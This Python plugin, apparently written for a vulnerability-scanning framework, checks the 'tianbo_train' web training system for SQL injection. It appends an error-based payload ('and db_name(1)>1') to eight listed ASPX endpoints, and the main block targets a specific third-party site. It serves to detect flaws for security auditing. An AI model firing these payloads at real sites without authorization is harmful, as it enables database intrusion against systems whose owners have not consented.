#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2010-053822
#refer:http://www.wooyun.org/bugs/wooyun-2010-061004

def assign(service, arg):
    if service == "tianbo_train":
        return True, arg

def audit(arg):
    payloads = [
        'Web_Org/Exam_Info.aspx?infoid=4128',
        'Web_Org/Tch_info.aspx?infoid=8',
        'Web_Org/St_Son_Index.aspx?infoid=4015',
        'Web_Org/New_Info.aspx?infoid=22',
        'Web_Org/course_info.aspx?infoid=22',
        'Web_Org/St_Stu_Thinking_Minute.aspx?info=22',
        'Web_Org/Notice_info.aspx?infoid=22',
        'Web_Org/Project_Info.aspx?infoid=22']
    getdata = '%20and%20db_name%281%29%3E1'
    for payload in payloads:
        url = arg + payload + getdata
        code, head, res, errcode, _ = curl.curl2(url)
        if code == 500 and 'master' in res :
            security_hole(url+'   :found sql Injection')

if __name__ == '__main__':
    from dummy import *
    audit(assign('tianbo_train','http://www.fenghuaedu.net/')[1])